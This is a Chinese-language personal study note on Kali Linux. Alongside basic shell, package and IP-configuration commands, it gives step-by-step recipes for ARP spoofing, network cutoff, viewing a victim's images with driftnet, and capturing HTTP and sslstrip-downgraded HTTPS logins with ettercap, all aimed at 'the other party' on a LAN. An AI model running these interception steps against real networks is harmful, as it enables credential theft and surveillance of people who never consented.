# Kali Linux 学习笔记

reboot 重启

shutdown -h now 立刻关机

shutdown -r now 立刻重启

Kali更新源:

​       1.输入leafpad /etc/apt/sources.list打卡kali源文本；

​       2.去百度搜索Kali更新源然后将其复制并粘贴到源文本中；

​       3.使用apt-get update命令来进行Kali源更新；

Kali美化：apt-get install kde-full

Kali安装输入法:

​        leafpad /etc/apt/sources.list添加更新源

​        apt-**get** update更新系统

​        apt-**get** install fcitx安装fcitx

​        apt-get install fcitx-googlepinyin安装谷歌拼音

​        reboot重新启动

ifconfig获取ip地址

dir ls   列出当前目录中的所有文件

sqlmap相当于啊D，明小子；都属于注入工具

查找这个文件所在的位置：find / -name 工具名字

如果忘记了某个命令怎么用则可以-help

fping -asg 192.168.1.0/24查询当前局域网内的所有IP地址

​                               ↑

​                          根据当前局域网的开头决定

如何使用ARP欺骗实现断网攻击:

​          arpspoof -i 网卡 -t 目标IP 目标默认网关

​      例: arpspoof -i eth0 -t 192.168.1.12 192.168.1.1

Arp欺骗：

​        目标IP流量经过我的网卡，从网关出去；

 如何实现IP流量转发: 1.先输入echo 1 >/proc/sys/net/ipv4/ip_forward

Arp断网:

​        目标IP流量经过我的网卡；

查看别人访问的所有图片:

​               1.使用arp欺骗；

​               2.使用driftnet -i eth0 命令实现查看本机流量中的图片                                                       （因为将对方IP流量访问的图片经过了本机流量所以当driftnet命令去读取图片时:实则读取的是对方访问过的图片)

Cat 查看内容: cat /proc/sys/net/ipv4/ip_forward

使用ettercap嗅探实现读取对方在HTTP加密中输入的账号和密码：

ettercap -Tq -i eth0      

   -Tq 启动文本安静模式      -T启动文本模式     q安静模式    -i 接网卡

获取对方在HTTP中输入的账号和密码:

​     1.输入echo 1 >/proc/sys/net/ipv4/ip_forward(将对方流量转化到从网关出去）

​     2.输入cat /proc/sys/net/ipv4/ip_forward  （实现读取文本)

​     3.输入ettercap -Tq -i eth0  （嗅探你在网页中的输入并将其展现给你)

​     4.输入arpspoof -i eth0 -t 192.168.1.xxx 192.168.1.1（进行arp欺骗)

   接受ettercap返回的信息；

注:有时嗅探到的是URL加密过的值，那么你可以去百度URL解码，再将ettercap嗅探嗅探到的URL加密码复制上去进行解码。

vim  文本编辑器:

​            vim 文件名

​            如何推出： 1.按一下esc键 

​                               2.按shift + ：并输入 q！按回车则可以退出。（q! 是退出不保存)

获取对方在HTTPS中输入的账号和密码:

​     1.输入vim /etc/ettercap/etter.conf

​     2.找到Linux下面的第二个if中的两个#号，将其删除

​     3.然后按下esc键，按shift+：键 ，输入wq（退出并保存)

​     4.sslstrip -a -f -k ：将一些HTTPS的链接还原为HTTP

​     5.进行arp欺骗

​    6.进行ettercap嗅探抓包

##                              **安全牛**

1. 熟悉KaliLinux基本命令:

- ​     命令  ls

​                   效果  列出当前目录中的所有文件

![img](F:\有道云笔记\qq31BDEC0D05E5A1626E555CD1BA33D617\8637c47a30c3465a8deae59ec2dad5f7\36dd9d99e8a4476880ab85dcb92b8a00.jpg)

​     注意 蓝:目录     绿:可执行文件    红:压缩包文件    白:普通文件 

- ​     命令 ls -l

​                   效果 以列表的形式列出当前目录中的所有文件

![img](F:\有道云笔记\qq31BDEC0D05E5A1626E555CD1BA33D617\e29f33752683475e93bf9eff3590a28f\82f65f174e79437ea197d127c1c64136.jpg)

​       注意    链接个数所有者所有组大小      修改日期           文件名

​     注意(开头字母)   d 目录    - 文件  c 字符型设备  l 链接  b 块设备(硬盘)

- ​     命令 ls -a

​                   效果 可显示隐藏文件(文件名以 "." 开头)

![img](F:\有道云笔记\qq31BDEC0D05E5A1626E555CD1BA33D617\5a4028ec5be048ea9c924524f857e1c9\baf6804dd5e847d0aacaa07604af20ae.jpg)

- ​     命令 ls -h

​                   效果 展现形式更易懂

![img](F:\有道云笔记\qq31BDEC0D05E5A1626E555CD1BA33D617\615c2b2dcd6d4751b1ce24c336f57961\13a28e4eb3ec4b96800805a1e2555471.jpg)

​	2.给KaliLinux进行更优的配置:

- IP配置:

1. dhclient eth0 可以让DHCP给我们自动分配一个IP地址
2. ifconfig eth0 想指定的IP地址/24(指定掩码位数)
3. route add dedault gw 192.168.1.1 指定一个网关(上网需要)
4. 